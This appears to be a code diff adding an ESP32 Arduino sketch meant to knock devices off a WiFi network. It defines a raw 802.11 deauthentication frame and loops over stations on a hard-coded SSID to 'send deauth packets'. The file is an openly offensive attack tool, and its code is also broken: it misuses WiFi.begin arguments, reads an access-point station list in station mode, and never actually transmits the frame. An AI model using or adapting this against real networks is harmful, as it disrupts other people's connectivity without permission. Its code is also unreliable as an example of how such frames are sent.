@@ -1,0 +1,63 @@
+#include <WiFi.h>
+
+uint8_t deauth_frame_default[26] = {
+  0xc0, 0x00, 0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xf0, 0xff, 0x02, 0x00
+};
+
+void listNetworks() {
+  int n = WiFi.scanNetworks();
+  Serial.println("Available networks:");
+  for (int i = 0; i < n; i++) {
+    Serial.print(i);
+    Serial.print(": ");
+    Serial.println(WiFi.SSID(i));
+  }
+}
+
+void sendDeauthPackets(String selected_ssid, uint8_t* deauth_frame) {
+  int num_devices = WiFi.softAPgetStationNum();
+  wifi_sta_list_t sta_list;
+  memset(&sta_list, 0, sizeof(sta_list));
+  esp_wifi_ap_get_sta_list(&sta_list);
+
+  for (int i = 0; i < sta_list.num; i++) {
+    String mac_address = "";
+    for (int j = 0; j < 6; j++) {
+      if (j > 0) {
+        mac_address += ":";
+      }
+      mac_address += String(sta_list.sta[i].mac[j], HEX);
+    }
+
+    WiFi.disconnect();
+    WiFi.mode(WIFI_STA);
+    WiFi.begin(selected_ssid.c_str(), mac_address.c_str(), 1, deauth_frame);
+    while (WiFi.status() != WL_DISCONNECTED) {
+      delay(10);
+    }
+    delay(10);
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  while (!Serial) {} // Wait for serial port to connect
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  listNetworks();
+  String selected_ssid = "MyWiFiNetwork";
+  sendDeauthPackets(selected_ssid, deauth_frame_default);
+
+  Serial.println("Deauthentication packets sent.");
+}
+
+void loop() {
+  // No action needed in loop for this example
+}
